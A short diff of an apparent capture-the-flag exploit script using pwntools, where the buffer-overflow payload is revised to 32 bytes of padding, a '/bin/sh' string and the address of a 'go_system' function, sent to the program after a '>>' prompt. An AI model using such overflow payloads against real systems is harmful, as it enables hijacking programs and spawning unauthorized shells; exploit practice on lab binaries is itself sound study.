@@ -21,11 +21,11 @@ def main():
     b*0x000000000040116c
 
                        ''')
-    payload = b'/bin/sh\0' 
-    payload += b'/bin/sh\0' 
-    payload += b'/bin/sh\0' 
-    payload += b'/bin/sh\0' 
-    payload += b'/bin/sh\0' 
+    payload = b'a'*8
+    payload += b'a'*8
+    payload += b'a'*8
+    payload += b'a'*8
+    payload += b'/bin/sh\0'
     payload += p64(go_system)
     p.sendlineafter(b'>>',payload)
 
